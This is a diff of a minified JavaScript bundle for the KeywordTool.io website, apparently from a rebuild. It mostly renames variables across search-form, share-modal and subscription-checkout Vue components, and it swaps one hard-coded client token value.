@@ -41,20 +41,20 @@ import {
     k as M,
     l as A,
     m as P,
-    p as L,
-    q as B,
-    B as $,
-    s as D,
+    p as $,
+    q as L,
+    B as D,
+    s as j,
     x as O,
-    y as j,
+    y as W,
     z as V,
     A as H,
     E as I,
     V as N,
-    G as R,
-    S as K,
-    H as J,
-    I as W,
+    G as B,
+    S as R,
+    H as K,
+    I as J,
     J as z,
     K as Y
 } from "./41r7p-v-2a47dbf7.js";
@@ -111,7 +111,7 @@ const ye = {},
         }))
     },
     fe = {
-        getToken: () => "e9c2d938-3cd6-4517-b0a1-73cbf0418e5c"
+        getToken: () => "30583fa4-1c51-4eca-b5c4-39b0381ee0b4"
     };
 window._ = r, window.Popper = s, window.bootstrap = {
     Carousel: i,
@@ -163,7 +163,7 @@ try {
             e.dataset.period == a && e.dataset.currency == o ? (e.classList.remove("d-none"), e.classList.add("d-block")) : (e.classList.remove("d-block"), e.classList.add("d-none"))
         }))
     }
-} catch (j2) {}
+} catch (W2) {}
 window.axios = G, window.axios.defaults.headers.common["X-Requested-With"] = "XMLHttpRequest";
 const be = ve;
 
@@ -526,7 +526,7 @@ const Me = {
     },
     Ae = ["id", "name", "required", "multiple", "disabled"],
     Pe = ["value"];
-const Le = Ue(Me, [
+const $e = Ue(Me, [
         ["render", function(e, t, r, s, a, o) {
             return b(), g("select", {
                 class: f(["form-select", o.classes]),
@@ -541,7 +541,7 @@ const Le = Ue(Me, [
             }, v(e.text), 9, Pe)))), 128))], 10, Ae)
         }]
     ]),
-    Be = {
+    Le = {
         props: ["shareUrl", "shareText", "locale"],
         async mounted() {
             const e = document.createElement("script");
@@ -561,16 +561,16 @@ const Le = Ue(Me, [
             null == r || r.remove()
         }
     },
-    $e = {
+    De = {
         class: "text-center lead fw-normal"
     },
-    De = {
+    je = {
         class: "list-inline text-center"
     },
     Oe = {
         class: "list-inline-item"
     },
-    je = S("div", {
+    We = S("div", {
         id: "fb-root"
     }, null, -1),
     Ve = ["data-href"],
@@ -582,7 +582,7 @@ const Le = Ue(Me, [
         class: "list-inline-item",
         ref: "linkedin"
     };
-const Re = Ue(Be, [
+const Be = Ue(Le, [
     ["render", function(e, t, r, s, a, o) {
         const i = k("modal");
         return b(), x(i, {
@@ -591,7 +591,7 @@ const Re = Ue(Be, [
             allow_close: !0
         }, {
             header: C((() => [S("h4", null, v(e.trans.get("Does KeywordTool.io help you with keyword research?")), 1)])),
-            body: C((() => [S("p", $e, [S("strong", null, v(e.trans.get("If yes, share it with your friends and followers now!")), 1)]), S("ul", De, [S("li", Oe, [je, S("div", {
+            body: C((() => [S("p", De, [S("strong", null, v(e.trans.get("If yes, share it with your friends and followers now!")), 1)]), S("ul", je, [S("li", Oe, [We, S("div", {
                 class: "fb-share-button",
                 "data-href": r.shareUrl,
                 "data-layout": "button_count",
@@ -609,7 +609,7 @@ const Re = Ue(Be, [
         })
     }]
 ]);
-const Ke = Ue({
+const Re = Ue({
         name: "VueCountable",
         props: {
             text: {
@@ -672,7 +672,7 @@ const Ke = Ue({
             return null
         }]
     ]),
-    Je = {
+    Ke = {
         name: "VueToggle",
         props: {
             disabled: {
@@ -718,15 +718,15 @@ const Ke = Ue({
         },
         methods: {}
     },
-    We = {
+    Je = {
         class: "form-check form-switch px-0 d-flex"
     },
     ze = ["innerHTML", "for"],
     Ye = ["id", "name", "disabled"],
     Ge = ["innerHTML", "for"];
-const Xe = Ue(Je, [
+const Xe = Ue(Ke, [
         ["render", function(e, t, r, s, a, o) {
-            return b(), g("div", We, [r.leftTitle ? (b(), g("label", {
+            return b(), g("div", Je, [r.leftTitle ? (b(), g("label", {
                 key: 0,
                 class: "form-check-label small",
                 innerHTML: r.leftTitle.trim(),
@@ -1095,7 +1095,7 @@ const Tt = Ue(ut, [
             const i = k("google-category"),
                 n = k("google-language"),
                 l = k("google-location-language"),
-                c = L("autofocus");
+                c = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1168,18 +1168,18 @@ const Tt = Ue(ut, [
     },
     At = ["for"],
     Pt = ["id", "placeholder"],
-    Lt = ["for"],
-    Bt = {
+    $t = ["for"],
+    Lt = {
         class: "col col-lg-1 my-1"
     },
-    $t = ["disabled"],
-    Dt = S("i", {
+    Dt = ["disabled"],
+    jt = S("i", {
         class: "bi bi-search me-1"
     }, null, -1),
     Ot = {
         class: "d-lg-none dl-xl-none"
     },
-    jt = S("input", {
+    Wt = S("input", {
         name: "search_event",
         type: "hidden",
         value: ""
@@ -1188,7 +1188,7 @@ const Vt = Ue(Ft, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("youtube-language"),
                 n = k("youtube-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1221,18 +1221,18 @@ const Vt = Ue(Ft, [
             }, [S("label", {
                 class: "visually-hidden",
                 for: "search-form-youtube-country-language-" + e.type
-            }, v(e.trans.get("Country / Language")), 9, Lt), e.language_dropdown_only ? (b(), x(i, {
+            }, v(e.trans.get("Country / Language")), 9, $t), e.language_dropdown_only ? (b(), x(i, {
                 key: 0,
                 dusk: "youtube-language"
             })) : (b(), x(n, {
                 key: 1,
                 dusk: "youtube-location-language",
                 location_country_only: !0
-            }))], 2), S("div", Bt, [S("button", {
+            }))], 2), S("div", Lt, [S("button", {
                 disabled: e.loading || e.loading_category || e.loading_language,
                 class: "search-form-youtube-submit btn btn-block btn-primary rounded-top-start-lg-0 rounded-bottom-start-lg-0",
                 type: "submit"
-            }, [Dt, S("span", Ot, v(e.trans.get("Search")), 1)], 8, $t)])]), jt], 40, qt)
+            }, [jt, S("span", Ot, v(e.trans.get("Search")), 1)], 8, Dt)])]), Wt], 40, qt)
         }]
     ]),
     Ht = {
@@ -1247,14 +1247,14 @@ const Vt = Ue(Ft, [
         name: "default_input",
         value: "keyword"
     }, null, -1),
-    Rt = {
+    Bt = {
         class: "row g-0"
     },
-    Kt = {
+    Rt = {
         class: "col-3 col-md-2 col-lg-1 my-1 me-n1px bing-category-wrapper"
     },
-    Jt = ["for"],
-    Wt = {
+    Kt = ["for"],
+    Jt = {
         class: "col my-1 me-lg-n1px"
     },
     zt = ["for"],
@@ -1282,7 +1282,7 @@ const sr = Ue(Ht, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("bing-category"),
                 n = k("bing-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1290,13 +1290,13 @@ const sr = Ue(Ht, [
                 class: "search-form-bing search-form",
                 method: "POST",
                 action: e.url
-            }, [Nt, S("div", Rt, [S("div", Kt, [S("label", {
+            }, [Nt, S("div", Bt, [S("div", Rt, [S("label", {
                 class: "visually-hidden",
                 for: "search-form-bing-category-" + e.type
-            }, v(e.trans.get("Category")), 9, Jt), E(i, {
+            }, v(e.trans.get("Category")), 9, Kt), E(i, {
                 dusk: "bing-category",
                 preoptions: r.categories
-            }, null, 8, ["preoptions"])]), S("div", Wt, [S("label", {
+            }, null, 8, ["preoptions"])]), S("div", Jt, [S("label", {
                 class: "visually-hidden",
                 for: "search-form-bing-keyword-" + e.type
             }, v(e.trans.get("Keyword")), 9, zt), F(S("input", {
@@ -1374,7 +1374,7 @@ const fr = Ue(ar, [
             const i = k("amazon-category"),
                 n = k("amazon-language"),
                 l = k("amazon-location-language"),
-                c = L("autofocus");
+                c = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1466,7 +1466,7 @@ const Pr = Ue(br, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("ebay-language"),
                 n = k("ebay-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1513,19 +1513,19 @@ const Pr = Ue(br, [
             }, [Ur, S("span", Mr, v(e.trans.get("Search")), 1)], 8, Er)])]), Ar], 40, vr)
         }]
     ]),
-    Lr = {
+    $r = {
         mixins: [_t],
         props: {},
         data: () => ({}),
         methods: {}
     },
-    Br = ["id", "action"],
-    $r = S("input", {
+    Lr = ["id", "action"],
+    Dr = S("input", {
         type: "hidden",
         name: "default_input",
         value: "keyword"
     }, null, -1),
-    Dr = {
+    jr = {
         class: "row g-0"
     },
     Or = S("input", {
@@ -1533,7 +1533,7 @@ const Pr = Ue(br, [
         name: "category",
         value: "software"
     }, null, -1),
-    jr = {
+    Wr = {
         class: "col my-1 me-lg-n1px"
     },
     Vr = ["for"],
@@ -1542,23 +1542,23 @@ const Pr = Ue(br, [
     Nr = {
         class: "col col-lg-1 my-1"
     },
-    Rr = ["disabled"],
-    Kr = S("i", {
+    Br = ["disabled"],
+    Rr = S("i", {
         class: "bi bi-search me-1"
     }, null, -1),
-    Jr = {
+    Kr = {
         class: "d-lg-none dl-xl-none"
     },
-    Wr = S("input", {
+    Jr = S("input", {
         name: "search_event",
         type: "hidden",
         value: ""
     }, null, -1);
-const zr = Ue(Lr, [
+const zr = Ue($r, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("app-store-language"),
                 n = k("app-store-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1566,7 +1566,7 @@ const zr = Ue(Lr, [
                 class: "search-form-app-store search-form",
                 method: "POST",
                 action: e.url
-            }, [$r, S("div", Dr, [Or, S("div", jr, [S("label", {
+            }, [Dr, S("div", jr, [Or, S("div", Wr, [S("label", {
                 class: "visually-hidden",
                 for: "search-app-store-keyword-" + e.type
             }, v(e.trans.get("Keyword")), 9, Vr), F(S("input", {
@@ -1602,7 +1602,7 @@ const zr = Ue(Lr, [
                 disabled: e.loading || e.loading_category || e.loading_language,
                 class: "search-form-app-store-submit btn btn-block btn-primary rounded-top-start-lg-0 rounded-bottom-start-lg-0",
                 type: "submit"
-            }, [Kr, S("span", Jr, v(e.trans.get("Search")), 1)], 8, Rr)])]), Wr], 40, Br)
+            }, [Rr, S("span", Kr, v(e.trans.get("Search")), 1)], 8, Br)])]), Jr], 40, Lr)
         }]
     ]),
     Yr = {
@@ -1650,7 +1650,7 @@ const _s = Ue(Yr, [
             const i = k("play-store-category"),
                 n = k("play-store-language"),
                 l = k("play-store-location-language"),
-                c = L("autofocus");
+                c = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1748,7 +1748,7 @@ const Ts = Ue(us, [
             const i = k("etsy-category"),
                 n = k("etsy-language"),
                 l = k("etsy-location-language"),
-                c = L("autofocus");
+                c = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1821,18 +1821,18 @@ const Ts = Ue(us, [
     },
     As = ["for"],
     Ps = ["id", "placeholder"],
-    Ls = ["for"],
-    Bs = {
+    $s = ["for"],
+    Ls = {
         class: "col col-lg-1 my-1"
     },
-    $s = ["disabled"],
-    Ds = S("i", {
+    Ds = ["disabled"],
+    js = S("i", {
         class: "bi bi-search me-1"
     }, null, -1),
     Os = {
         class: "d-lg-none dl-xl-none"
     },
-    js = S("input", {
+    Ws = S("input", {
         name: "search_event",
         type: "hidden",
         value: ""
@@ -1841,7 +1841,7 @@ const Vs = Ue(Fs, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("instagram-language"),
                 n = k("instagram-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1874,18 +1874,18 @@ const Vs = Ue(Fs, [
             }, [S("label", {
                 class: "visually-hidden",
                 for: "search-form-instagram-country-language-" + e.type
-            }, v(e.trans.get("Country / Language")), 9, Ls), e.language_dropdown_only ? (b(), x(i, {
+            }, v(e.trans.get("Country / Language")), 9, $s), e.language_dropdown_only ? (b(), x(i, {
                 key: 0,
                 dusk: "instagram-language"
             })) : (b(), x(n, {
                 key: 1,
                 dusk: "instagram-location-language",
                 location_country_only: !0
-            }))], 2), S("div", Bs, [S("button", {
+            }))], 2), S("div", Ls, [S("button", {
                 disabled: e.loading || e.loading_category || e.loading_language,
                 class: "search-form-instagram-submit btn btn-block btn-primary rounded-top-start-lg-0 rounded-bottom-start-lg-0",
                 type: "submit"
-            }, [Ds, S("span", Os, v(e.trans.get("Search")), 1)], 8, $s)])]), js], 40, qs)
+            }, [js, S("span", Os, v(e.trans.get("Search")), 1)], 8, Ds)])]), Ws], 40, qs)
         }]
     ]),
     Hs = {
@@ -1900,14 +1900,14 @@ const Vs = Ue(Fs, [
         name: "default_input",
         value: "keyword"
     }, null, -1),
-    Rs = {
+    Bs = {
         class: "row g-0"
     },
-    Ks = {
+    Rs = {
         class: "col my-1 me-lg-n1px"
     },
-    Js = ["for"],
-    Ws = ["id", "placeholder"],
+    Ks = ["for"],
+    Js = ["id", "placeholder"],
     zs = ["for"],
     Ys = {
         class: "col col-lg-1 my-1"
@@ -1928,7 +1928,7 @@ const ea = Ue(Hs, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("twitter-language"),
                 n = k("twitter-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -1936,10 +1936,10 @@ const ea = Ue(Hs, [
                 class: "search-form-twitter search-form",
                 method: "POST",
                 action: e.url
-            }, [Ns, S("div", Rs, [S("div", Ks, [S("label", {
+            }, [Ns, S("div", Bs, [S("div", Rs, [S("label", {
                 class: "visually-hidden",
                 for: "search-form-twitter-keyword-" + e.type
-            }, v(e.trans.get("Keyword")), 9, Js), F(S("input", {
+            }, v(e.trans.get("Keyword")), 9, Ks), F(S("input", {
                 "onUpdate:modelValue": t[0] || (t[0] = t => e.current_keyword = t),
                 onPaste: t[1] || (t[1] = (...t) => e.paste && e.paste(...t)),
                 autocapitalize: "off",
@@ -1953,7 +1953,7 @@ const ea = Ue(Hs, [
                 required: "",
                 spellcheck: !1,
                 type: "text"
-            }, null, 42, Ws), [
+            }, null, 42, Js), [
                 [U, e.current_keyword],
                 [l, e.do_autofocus]
             ])]), S("div", {
@@ -2015,7 +2015,7 @@ const ha = Ue(ta, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("pinterest-language"),
                 n = k("pinterest-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -2109,7 +2109,7 @@ const Ma = Ue(pa, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("google-trends-category"),
                 n = k("google-trends-country"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -2162,20 +2162,20 @@ const Ma = Ue(pa, [
         methods: {}
     },
     Pa = ["id", "action"],
-    La = S("input", {
+    $a = S("input", {
         type: "hidden",
         name: "default_input",
         value: "keyword"
     }, null, -1),
-    Ba = {
+    La = {
         class: "row g-0"
     },
-    $a = {
+    Da = {
         class: "col my-1"
     },
-    Da = ["for"],
-    Oa = ["id", "placeholder"],
     ja = ["for"],
+    Oa = ["id", "placeholder"],
+    Wa = ["for"],
     Va = {
         class: "col col-lg-1 my-1"
     },
@@ -2186,16 +2186,16 @@ const Ma = Ue(pa, [
     Na = {
         class: "d-lg-none dl-xl-none"
     },
-    Ra = S("input", {
+    Ba = S("input", {
         name: "search_event",
         type: "hidden",
         value: ""
     }, null, -1);
-const Ka = Ue(Aa, [
+const Ra = Ue(Aa, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tiktok-language"),
                 n = k("tiktok-location-language"),
-                l = L("autofocus");
+                l = $("autofocus");
             return b(), g("form", {
                 onSubmit: t[2] || (t[2] = A(((...t) => e.submit && e.submit(...t)), ["prevent"])),
                 ref: "searchForm",
@@ -2203,10 +2203,10 @@ const Ka = Ue(Aa, [
                 class: "search-form-tiktok search-form",
                 method: "POST",
                 action: e.url
-            }, [La, S("div", Ba, [S("div", $a, [S("label", {
+            }, [$a, S("div", La, [S("div", Da, [S("label", {
                 class: "visually-hidden",
                 for: "search-form-tiktok-keyword-" + e.type
-            }, v(e.trans.get("Keyword")), 9, Da), F(S("input", {
+            }, v(e.trans.get("Keyword")), 9, ja), F(S("input", {
                 "onUpdate:modelValue": t[0] || (t[0] = t => e.current_keyword = t),
                 onPaste: t[1] || (t[1] = (...t) => e.paste && e.paste(...t)),
                 autocapitalize: "off",
@@ -2228,7 +2228,7 @@ const Ka = Ue(Aa, [
             }, [S("label", {
                 class: "visually-hidden",
                 for: "search-form-tiktok-country-language-" + e.type
-            }, v(e.trans.get("Country / Language")), 9, ja), e.language_dropdown_only ? (b(), x(i, {
+            }, v(e.trans.get("Country / Language")), 9, Wa), e.language_dropdown_only ? (b(), x(i, {
                 key: 0,
                 dusk: "tiktok-language"
             })) : (b(), x(n, {
@@ -2239,10 +2239,10 @@ const Ka = Ue(Aa, [
                 disabled: e.loading || e.loading_category || e.loading_language,
                 class: "search-form-tiktok-submit btn btn-block btn-primary rounded-top-start-lg-0 rounded-bottom-start-lg-0",
                 type: "submit"
-            }, [Ia, S("span", Na, v(e.trans.get("Search")), 1)], 8, Ha)])]), Ra], 40, Pa)
+            }, [Ia, S("span", Na, v(e.trans.get("Search")), 1)], 8, Ha)])]), Ba], 40, Pa)
         }]
     ]),
-    Ja = {
+    Ka = {
         props: {
             default_plan: {
                 type: Object,
@@ -2734,7 +2734,7 @@ const Ka = Ue(Aa, [
             }
         }
     },
-    Wa = S("i", {
+    Ja = S("i", {
         class: "bi bi-arrow-left me-1"
     }, null, -1),
     za = {
@@ -2854,21 +2854,21 @@ const Ka = Ue(Aa, [
     },
     Ao = ["innerHTML"],
     Po = ["disabled"],
-    Lo = ["innerHTML"],
-    Bo = {
+    $o = ["innerHTML"],
+    Lo = {
         class: "second-step-section"
     },
-    $o = {
+    Do = {
         key: 0,
         class: "card child-account-addon"
     },
-    Do = {
+    jo = {
         class: "card-body"
     },
     Oo = {
         class: "row"
     },
-    jo = {
+    Wo = {
         class: "col"
     },
     Vo = {
@@ -2881,14 +2881,14 @@ const Ka = Ue(Aa, [
     No = {
         class: "col-12 col-md-4"
     },
+    Bo = ["disabled"],
     Ro = ["disabled"],
-    Ko = ["disabled"],
-    Jo = S("div", {
+    Ko = S("div", {
         class: "col-12"
     }, [S("hr", {
         class: "mt-4"
     })], -1),
-    Wo = {
+    Jo = {
         class: "col-12 col-md-8"
     },
     zo = {
@@ -3007,15 +3007,15 @@ const Ka = Ue(Aa, [
         class: "w-50 ms-2"
     },
     Pi = ["disabled"],
+    $i = ["src"],
     Li = ["src"],
-    Bi = ["src"],
-    $i = S("br", null, null, -1),
     Di = S("br", null, null, -1),
+    ji = S("br", null, null, -1),
     Oi = {
         key: 3,
         class: "row my-4"
     },
-    ji = {
+    Wi = {
         class: "col"
     },
     Vi = ["disabled"],
@@ -3027,14 +3027,14 @@ const Ka = Ue(Aa, [
     Ni = {
         class: "col"
     },
-    Ri = ["disabled"],
-    Ki = {
+    Bi = ["disabled"],
+    Ri = {
         class: "col-12 col-md-4"
     },
-    Ji = {
+    Ki = {
         key: 0
     },
-    Wi = {
+    Ji = {
         key: 0,
         class: "card bg-light border-0 mb-4"
     },
@@ -3156,23 +3156,23 @@ const Ka = Ue(Aa, [
         key: 0,
         class: "d-flex justify-content-between fw-bold"
     },
+    $n = {
+        class: "my-0"
+    },
     Ln = {
         class: "my-0"
     },
-    Bn = {
-        class: "my-0"
-    },
-    $n = {
+    Dn = {
         key: 1,
         class: "d-flex justify-content-between"
     },
-    Dn = {
+    jn = {
         class: "fw-bold my-0 me-1"
     },
     On = {
         class: "fw-bold my-0"
     },
-    jn = {
+    Wn = {
         key: 2,
         class: "d-flex justify-content-between"
     },
@@ -3189,13 +3189,13 @@ const Ka = Ue(Aa, [
     Nn = {
         key: 0
     },
-    Rn = ["innerHTML"],
-    Kn = ["data-bs-content"],
-    Jn = {
+    Bn = ["innerHTML"],
+    Rn = ["data-bs-content"],
+    Kn = {
         key: 1
     },
-    Wn = ["innerHTML"];
-const zn = Ue(Ja, [
+    Jn = ["innerHTML"];
+const zn = Ue(Ka, [
         ["render", function(e, t, r, s, a, o) {
             var i, n, l, c, _, u;
             const d = k("loading-section"),
@@ -3210,7 +3210,7 @@ const zn = Ue(Ja, [
             }, null, 8, ["loading"])), S("button", {
                 class: "btn btn-light",
                 onClick: t[0] || (t[0] = (...e) => o.back && o.back(...e))
-            }, [Wa, P(" " + v(e.trans.get("Back")), 1)]), S("div", za, [S("div", Ya, [S("div", Ga, ["" == a.subscription_note || !o.is_upgrade && !o.is_addon || 0 != o.is_change_period || r.is_trial_user ? "" == a.subscription_note || r.allow_subscription ? T("", !0) : (b(), g("div", Za, [S("div", {
+            }, [Ja, P(" " + v(e.trans.get("Back")), 1)]), S("div", za, [S("div", Ya, [S("div", Ga, ["" == a.subscription_note || !o.is_upgrade && !o.is_addon || 0 != o.is_change_period || r.is_trial_user ? "" == a.subscription_note || r.allow_subscription ? T("", !0) : (b(), g("div", Za, [S("div", {
                 innerHTML: a.subscription_note
             }, null, 8, eo)])) : (b(), g("div", Xa, [S("div", {
                 innerHTML: a.subscription_note
@@ -3282,9 +3282,9 @@ const zn = Ue(Ja, [
             }, v(e.trans.get("Create Keyword Tool Account")), 9, Po), S("small", {
                 innerHTML: a.term,
                 class: "d-block mt-3 text-muted"
-            }, null, 8, Lo)], 32)], 512), [
-                [B, 1 == a.step]
-            ]), F(S("div", Bo, [o.account_price > 0 ? (b(), g("div", $o, [S("div", Do, [S("div", Oo, [S("div", jo, [S("h5", null, v(e.trans.get("Additional User Accounts")), 1)])]), S("div", Vo, [S("div", Ho, [S("p", {
+            }, null, 8, $o)], 32)], 512), [
+                [L, 1 == a.step]
+            ]), F(S("div", Lo, [o.account_price > 0 ? (b(), g("div", Do, [S("div", jo, [S("div", Oo, [S("div", Wo, [S("h5", null, v(e.trans.get("Additional User Accounts")), 1)])]), S("div", Vo, [S("div", Ho, [S("p", {
                 innerHTML: e.trans.get(":plan comes with <strong>:count</strong> user accounts. Select this add-on if you need more.", {
                     plan: a.plan.plan_shortname,
                     count: a.plan.child_account
@@ -3297,15 +3297,15 @@ const zn = Ue(Ja, [
                 type: "button",
                 onClick: t[4] || (t[4] = e => o.toggleAddon("user_account")),
                 class: "btn btn-danger btn-block"
-            }, v(e.trans.get("Remove")), 9, Ro)) : (b(), g("button", {
+            }, v(e.trans.get("Remove")), 9, Bo)) : (b(), g("button", {
                 key: 1,
                 disabled: a.loading || !r.allow_subscription,
                 type: "button",
                 onClick: t[5] || (t[5] = e => o.toggleAddon("user_account")),
                 class: "btn btn-primary btn-block"
-            }, v(e.trans.get("Add")), 9, Ko))], 64))]), a.selected_addon.user_account ? (b(), g(y, {
+            }, v(e.trans.get("Add")), 9, Ro))], 64))]), a.selected_addon.user_account ? (b(), g(y, {
                 key: 0
-            }, [Jo, S("div", Wo, [S("div", zo, [S("label", Yo, v(e.trans.get("Total Number Of User Accounts")), 1), S("div", Go, [E(m, {
+            }, [Ko, S("div", Jo, [S("div", zo, [S("label", Yo, v(e.trans.get("Total Number Of User Accounts")), 1), S("div", Go, [E(m, {
                 disabled: a.loading || !r.allow_subscription,
                 options: o.child_account_list,
                 settings: {},
@@ -3343,7 +3343,7 @@ const zn = Ue(Ja, [
                 value: a.drag_daily_limit,
                 class: "form-control"
             }, null, 8, ui)]), di], 64)) : T("", !0)])])])) : T("", !0)], 512), [
-                [B, 2 == a.step]
+                [L, 2 == a.step]
             ]), F(S("div", mi, ["" != a.error ? (b(), g("div", hi, [S("table", null, [S("tbody", null, [S("tr", null, [pi, S("td", {
                 innerHTML: a.error
             }, null, 8, gi)])])])])) : "" != a.success ? (b(), g("div", yi, [S("table", null, [S("tbody", null, [S("tr", null, [wi, S("td", {
@@ -3380,14 +3380,14 @@ const zn = Ue(Ja, [
                 height: "21",
                 alt: "American Express",
                 title: "American Express"
-            }, null, 8, Li), S("img", {
+            }, null, 8, $i), S("img", {
                 class: "checkout-form-payment-method-jcb border border-white me-1",
                 src: "/images/payment-method-jcb.png",
                 height: "21",
                 alt: "Japan Credit Bureau",
                 title: "Japan Credit Bureau"
-            }, null, 8, Bi), $i, S("small", null, v(e.trans.get("American Express or JCB")), 1)], 10, Pi)])])], 512)), [
-                [B, 2 != r.payment_source && ("" == r.customer_id || "" == (null == (c = r.billing_card) ? void 0 : c.number) || !o.is_change_period)]
+            }, null, 8, Li), Di, S("small", null, v(e.trans.get("American Express or JCB")), 1)], 10, Pi)])])], 512)), [
+                [L, 2 != r.payment_source && ("" == r.customer_id || "" == (null == (c = r.billing_card) ? void 0 : c.number) || !o.is_change_period)]
             ]), "" != r.customer_id && 2 == r.payment_source ? (b(), x(h, {
                 key: 1,
                 dusk: "payment-method",
@@ -3493,8 +3493,8 @@ const zn = Ue(Ja, [
                 skip_trial: r.skip_trial,
                 hide_form: !("" == r.customer_id || "" == (null == (u = r.billing_card) ? void 0 : u.number) || !o.is_change_period)
             }, null, 8, ["onHideError", "onShowError", "onProcessSuccess", "onProcessDueAmount", "onProcessSubscriptionNote", "plan", "payment_method", "currency", "billing_id", "default_payment_source", "customer_id", "billing_card", "name", "email", "token_url", "due_amount_url", "process_url", "routes", "allow_subscription", "is_captcha", "due_amount", "child_account", "daily_limit", "subscription_id", "free_trial", "skip_trial", "hide_form"]))])])])], 512), [
-                [B, 3 == a.step]
-            ]), Di, 2 == a.step ? (b(), g("div", Oi, [S("div", ji, [o.is_pro ? (b(), g("button", {
+                [L, 3 == a.step]
+            ]), ji, 2 == a.step ? (b(), g("div", Oi, [S("div", Wi, [o.is_pro ? (b(), g("button", {
                 key: 0,
                 disabled: a.loading || 0 == o.validateStep2() || !r.allow_subscription || r.default_child_account == a.max_child_allocated || o.is_addon && r.default_child_account == a.child_account,
                 type: "button",
@@ -3519,9 +3519,9 @@ const zn = Ue(Ja, [
                 key: 1
             }, [P(v(e.trans.get("Update Subscription")), 1)], 64)) : (b(), g(y, {
                 key: 2
-            }, [P(v(e.trans.get("Start My Subscription")), 1)], 64))], 8, Ri)])])) : T("", !0)], 64)) : T("", !0)]), S("div", Ki, [r.allow_subscription ? (b(), g(y, {
+            }, [P(v(e.trans.get("Start My Subscription")), 1)], 64))], 8, Bi)])])) : T("", !0)], 64)) : T("", !0)]), S("div", Ri, [r.allow_subscription ? (b(), g(y, {
                 key: 0
-            }, [1 == a.step ? (b(), g("div", Ji, [r.allow_free_trial ? (b(), g("div", Wi, [S("h6", zi, v(e.trans.get("What You Will Get in 7-Days Trial")), 1), S("div", Yi, [S("dl", Gi, [Xi, S("dd", Qi, v(e.trans.get("Access to all our features")), 1), Zi, S("dd", en, v(e.trans.get("Data for every city, country, and language supported by Google, Bing, and search engines.")), 1), tn, S("dd", rn, v(e.trans.get("Get precise monthly search volume data (and not ranges)")), 1), sn, S("dd", an, v(e.trans.get("Check Search Volume in bulk for any keyword list")), 1), on, S("dd", nn, v(e.trans.get("Switch between plans anytime")), 1), ln, S("dd", cn, v(e.trans.get("Limited keyword searches per day")), 1)])])])) : (b(), g("blockquote", _n, [un, dn, P(" has enabled us to quickly "), mn, P(", do keyword research at scale, and gather data at different geo levels. "), hn]))])) : 2 == a.step || 3 == a.step ? (b(), g("div", pn, [S("div", gn, [S("h5", yn, v(e.trans.get("Billing Summary")), 1), S("div", wn, [S("div", null, [E(w, {
+            }, [1 == a.step ? (b(), g("div", Ki, [r.allow_free_trial ? (b(), g("div", Ji, [S("h6", zi, v(e.trans.get("What You Will Get in 7-Days Trial")), 1), S("div", Yi, [S("dl", Gi, [Xi, S("dd", Qi, v(e.trans.get("Access to all our features")), 1), Zi, S("dd", en, v(e.trans.get("Data for every city, country, and language supported by Google, Bing, and search engines.")), 1), tn, S("dd", rn, v(e.trans.get("Get precise monthly search volume data (and not ranges)")), 1), sn, S("dd", an, v(e.trans.get("Check Search Volume in bulk for any keyword list")), 1), on, S("dd", nn, v(e.trans.get("Switch between plans anytime")), 1), ln, S("dd", cn, v(e.trans.get("Limited keyword searches per day")), 1)])])])) : (b(), g("blockquote", _n, [un, dn, P(" has enabled us to quickly "), mn, P(", do keyword research at scale, and gather data at different geo levels. "), hn]))])) : 2 == a.step || 3 == a.step ? (b(), g("div", pn, [S("div", gn, [S("h5", yn, v(e.trans.get("Billing Summary")), 1), S("div", wn, [S("div", null, [E(w, {
                 class: "justify-content-end",
                 disabled: "" != r.customer_id && 2 == r.payment_source || !r.allow_subscription || o.is_change_period,
                 "left-title": e.trans.get("Monthly Billing"),
@@ -3548,12 +3548,12 @@ const zn = Ue(Ja, [
                 key: 0
